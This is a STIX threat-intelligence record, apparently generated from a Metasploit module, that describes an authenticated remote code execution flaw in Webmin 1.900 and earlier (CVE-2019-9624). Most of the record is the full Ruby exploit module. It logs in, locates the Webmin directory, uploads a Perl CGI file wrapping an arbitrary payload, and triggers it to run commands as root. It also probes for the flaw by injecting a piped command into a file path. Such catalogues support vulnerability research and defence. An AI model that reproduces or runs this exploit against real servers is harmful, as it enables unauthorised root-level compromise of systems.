{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1d657a2-2ae6-40f9-bfbe-8d81bbecae77",
    "created": "2024-08-14T17:12:04.273829Z",
    "modified": "2024-08-14T17:12:04.273833Z",
    "name": "Webmin Upload Authenticated RCE",
    "description": "( This module exploits an arbitrary command execution vulnerability in Webmin 1.900 and lower versions. Any user authorized to the \"Upload and Download\" module can execute arbitrary commands with root privileges.  In addition, if the 'Running Processes' (proc) privilege is set the user can accurately determine which directory to upload to. Webmin application files can be written/overwritten, which allows remote code execution. The module has been tested successfully with Webmin 1.900 on Ubuntu v18.04.  Using GUESSUPLOAD attempts to use a default installation path in order to trigger the exploit. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/webmin_upload_exec.rb",
            "external_id": "webmin_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9624"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.com.tr/exploits/Webmin-1900-Remote-Command-Execution.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Webmin Upload Authenticated RCE',\n      'Description'    => %q(\n        This module exploits an arbitrary command execution vulnerability in Webmin\n        1.900 and lower versions. Any user authorized to the \"Upload and Download\"\n        module can execute arbitrary commands with root privileges.\n\n        In addition, if the 'Running Processes' (proc) privilege is set the user can\n        accurately determine which directory to upload to. Webmin application files\n        can be written/overwritten, which allows remote code execution. The module\n        has been tested successfully with Webmin 1.900 on Ubuntu v18.04.\n\n        Using GUESSUPLOAD attempts to use a default installation path in order to\n        trigger the exploit.\n      ),\n      'Author'         => [\n        'AkkuS <\u00d6zkan Mustafa Akku\u015f>',                  # Vulnerability Discovery, Initial PoC module\n        'Ziconius <Kris.Anderson[at]immersivelabs.com>' # Updated MSF module; removing 'proc' requirement.\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2019-9624'],\n          ['EDB', '46201'],\n          ['URL', 'https://pentest.com.tr/exploits/Webmin-1900-Remote-Command-Execution.html']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'perl'\n            }\n        },\n      'DefaultOptions' =>\n        {\n          'RPORT' => 10000,\n          'SSL'   => true\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Webmin <= 1.900', {}]],\n      'DisclosureDate' => '2019-01-17',\n      'DefaultTarget'  => 0)\n    )\n    register_options [\n        OptBool.new('GUESSUPLOAD', [true, 'If no \"proc\" permissions exists use default path.', false]),\n        OptString.new('USERNAME',  [true, 'Webmin Username']),\n        OptString.new('PASSWORD',  [true, 'Webmin Password']),\n        OptString.new('FILENAME',  [false, 'Filename used for the uploaded data']),\n        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])\n    ]\n  end\n\n  def login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'session_login.cgi'),\n      'cookie' => 'testing=1',\n      'vars_post' => {\n        'page' => '',\n        'user' => datastore['USERNAME'],\n        'pass' => datastore['PASSWORD']\n      }\n    })\n\n    if res && res.code == 302 && res.get_cookies =~ /sid=(\\w+)/\n      return $1\n    end\n\n    return nil unless res\n    ''\n  end\n\n  ##\n  # Target and input verification\n  ##\n  def check\n    cookie = login\n    return CheckCode::Detected if cookie == ''\n    return CheckCode::Unknown if cookie.nil?\n\n    vprint_status('Attempting to execute...')\n    command = \"echo #{rand_text_alphanumeric(0..9)}\"\n\n    res = send_request_cgi({\n      'uri'     => \"#{target_uri}/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|\",\n      'cookie'  => \"sid=#{cookie}\"\n    })\n\n    if res && res.code == 200 && res.message =~ /Document follows/\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  end\n\n  ##\n  # Exploiting phase\n  ##\n  def exploit\n    cookie = login\n    if cookie == '' || cookie.nil?\n      fail_with(Failure::Unknown, 'Failed to retrieve session cookie')\n    end\n    print_good(\"Session cookie: #{cookie}\")\n\n    ##\n    # Directory and SSL verification for referer\n    ##\n    phost = ssl ? 'https://' : 'http://'\n    phost << peer\n    print_status(\"Target URL => #{phost}\")\n\n    res = send_request_raw(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'proc', 'index_tree.cgi'),\n      'headers' =>\n        {\n          'Referer' => \"#{phost}/sysinfo.cgi?xnavigation=1\"\n        },\n      'cookie' => \"redirect=1; testing=1; sid=#{cookie}\"\n    )\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, 'Request failed')\n    end\n\n    print_status 'Searching for directory to upload...'\n    if res.body =~ /Running Processes/ && res.body =~ /[^ ] ([\\/\\w]+)miniserv\\.pl/\n      directory = $1\n    elsif datastore['GUESSUPLOAD']\n      print_warning('Could not determine upload directory. Using /usr/share/webmin/')\n      directory = '/usr/share/webmin/'\n    else\n      print_error('Failed to determine webmin share directory')\n      print_error('Set GUESSUPLOAD to attempt upload to a default location')\n      return\n    end\n    directory << 'file'\n    filename = datastore['FILENAME'].present? ? datastore['FILENAME'] : \"#{rand_text_alpha_lower(5..8)}.cgi\"\n    filename << '.cgi' unless filename.end_with?('.cgi')\n    upload_attempt(phost, cookie, directory, filename)\n\n    ##\n    # Loading phase of the vulnerable file\n    # Command execution and shell retrieval\n    ##\n    print_status(\"Attempting to execute the payload...\")\n    command = payload.encoded\n    res = send_request_cgi({\n      'uri'     => normalize_uri(target_uri, 'file', filename),\n      'cookie'  => \"sid=#{cookie}\"\n    })\n  end\n\n  def upload_attempt(phost, cookie, dir, filename)\n    limit = rand_text_alpha_upper(5..10)\n    tmpvar = rand_text_alpha_upper(3..8)\n    code = <<~HERE\n    #!/usr/bin/perl\n    $#{tmpvar} = <<'#{limit}';\n    #{payload.encoded}\n    #{limit}\n    `$#{tmpvar}`;\n    HERE\n\n    message = Rex::MIME::Message.new\n    message.add_part(code, nil, nil, \"form-data; name=\\\"upload0\\\"; filename=\\\"#{filename}\\\"\")\n    message.add_part(dir, nil, nil, 'form-data; name=\"dir\"')\n    message.add_part('root', nil, nil, 'form-data; name=\"user\"')\n    message.add_part('1', nil, nil, 'form-data;  name=\"group_def\"')\n    message.add_part('', nil, nil, 'form-data;  name=\"group\"')\n    message.add_part('0', nil, nil, 'form-data;  name=\"zip\"')\n    message.add_part('1', nil, nil, 'form-data;  name=\"email_def\"')\n    message.add_part('Upload', nil, nil, 'form-data;  name=\"ok\"')\n\n    res2 = send_request_raw(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'updown', 'upload.cgi'),\n      'vars_get' => {'id' => \"#{rand_text_numeric(8..12)}\"},\n      'data' => message.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{message.bound}\",\n      'headers' =>\n        {\n          'Referer' => \"#{phost}/updown/?xnavigation=1\"\n        },\n      'cookie' => \"redirect=1; testing=1; sid=#{cookie}\"\n    )\n\n    if res2 && res2.code == 200 && res2.body =~ /Saving file/\n      print_good \"File #{filename} was successfully uploaded.\"\n      register_file_for_cleanup(filename)\n    else\n      print_error 'Upload failed.'\n      fail_with(Failure::UnexpectedReply, 'Failed to upload file')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-01-17",
    "x_mitre_platforms": [
        "unix'"
    ]
}